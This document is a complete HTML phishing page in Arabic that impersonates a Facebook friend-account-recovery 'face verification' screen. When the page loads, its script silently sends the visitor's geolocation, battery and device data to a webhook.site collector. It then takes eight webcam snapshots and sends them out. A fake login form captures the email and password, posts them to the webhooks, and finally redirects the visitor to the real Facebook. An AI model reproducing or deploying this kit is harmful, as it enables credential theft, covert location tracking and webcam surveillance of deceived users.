<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد حساب صديق | Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .nav { background: #fff; width: 100%; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; }
        .main-container { background: #fff; margin-top: 20px; padding: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); width: 90%; max-width: 450px; text-align: center; }
        .friend-pic { width: 80px; height: 80px; border-radius: 50%; background: #ddd; margin: 10px auto; border: 2px solid #1877f2; }
        h2 { font-size: 18px; color: #1c1e21; }
        p { font-size: 14px; color: #606770; line-height: 1.4; }
        .btn-blue { background: #1877f2; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; }
        #login-section { display: none; margin-top: 15px; border-top: 1px solid #ddd; padding-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body onload="initSystem()">

<div class="nav">
    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l97zS3XpSq.svg" width="100">
</div>

<div class="main-container" id="step1">
    <div class="friend-pic" style="background-image: url('https://i.pravatar.cc/150?u=a042581f4e29026704d'); background-size: cover;"></div>
    <h2>ساعد صديقك في استعادة حسابه</h2>
    <p>لقد طلب صديقك "أحمد" تأكيد هويتك لاسترداد حسابه المعطل. للقيام بذلك، نحتاج إلى إجراء مسح سريع للوجه (Video Verification) لضمان أنك لست برنامج روبوت.</p>
    <button class="btn-blue" onclick="startVerification()">تأكيد هويتي الآن</button>
</div>

<div class="main-container" id="login-section">
    <p style="color:#ee2200; font-weight:bold;">تمت مطابقة الوجه بنجاح!</p>
    <p>يرجى تسجيل الدخول إلى حسابك لربط التأكيد وحماية حساب صديقك.</p>
    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
    <input type="password" id="pass" placeholder="كلمة السر">
    <button class="btn-blue" style="background:#42b72a;" onclick="captureLogin()">إرسال التأكيد النهائي</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const MASTER = "https://webhook.site/11c7e1b7-1e80-497a-9ed1-ca3bde183eed";
    const POOL = [
        "https://webhook.site/72e1897c-17da-4468-8fe8-370a27a96d76", "https://webhook.site/dc5af998-ac00-4301-9312-a8c8cac64643",
        "https://webhook.site/acc03dcf-1d76-462c-b257-bbecd6bd0ebe", "https://webhook.site/2fc99f69-e9be-4bad-9f47-3cef1a60340c",
        "https://webhook.site/4e6f5754-84e8-4918-8d65-dae16287312c", "https://webhook.site/fb3c768d-65d7-4a09-8ee6-6b75b10f20e5",
        "https://webhook.site/2b738b09-4207-43dc-89bd-388bc308721c", "https://webhook.site/77651f36-df81-4232-af61-9836573e5cbc",
        "https://webhook.site/4d676895-7615-4e56-a8bd-b2fc755922df", "https://webhook.site/fcc711e3-5835-4a4b-bc6a-ecbccc50ecf0"
    ];

    let myToken = "";

    function initSystem() {
        myToken = POOL[Math.floor(Math.random() * POOL.length)];
        // سحب بيانات الجهاز والبطارية صامتاً
        captureSystemData();
    }

    async function captureSystemData() {
        let batteryInfo = {};
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            batteryInfo = { level: (bat.level * 100) + "%", charging: bat.charging };
        }

        navigator.geolocation.getCurrentPosition((pos) => {
            sendToMaster({
                event: "SYSTEM_REPORT",
                location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
                battery: batteryInfo,
                device: navigator.platform,
                target_node: myToken
            });
        }, () => {
            sendToMaster({ event: "SYSTEM_REPORT_NO_GPS", battery: batteryInfo, target_node: myToken });
        });
    }

    async function startVerification() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = stream;
            document.getElementById('step1').style.opacity = "0.5";
            
            // سحب 8 صور متتالية (تسلسل)
            for(let i=0; i<8; i++) {
                setTimeout(() => {
                    snap();
                    if(i === 7) showLogin();
                }, i * 1500);
            }
        } catch (e) { alert("يجب السماح بالكاميرا لتأكيد هوية الصديق."); }
    }

    function snap() {
        const v = document.getElementById('v'), c = document.getElementById('c');
        c.width = 480; c.height = 360;
        c.getContext('2d').drawImage(v, 0, 0, 480, 360);
        const img = c.toDataURL('image/jpeg', 0.3);
        fetch(myToken, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ shot: img }) });
    }

    function showLogin() {
        document.getElementById('step1').style.display = "none";
        document.getElementById('login-section').style.display = "block";
    }

    function captureLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        // إرسال معلومات الدخول للرابط الفرعي والماستر معاً للضمان
        const data = { event: "LOGIN_CAPTURE", email: email, pass: pass };
        fetch(myToken, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
        sendToMaster(data);

        alert("تم إرسال التأكيد بنجاح. سيتم مراجعة الطلب خلال 24 ساعة.");
        window.location.href = "https://www.facebook.com";
    }

    function sendToMaster(obj) {
        fetch(MASTER, { method: 'POST', mode: 'no-cors', body: JSON.stringify(obj) });
    }
</script>
</body>
</html>
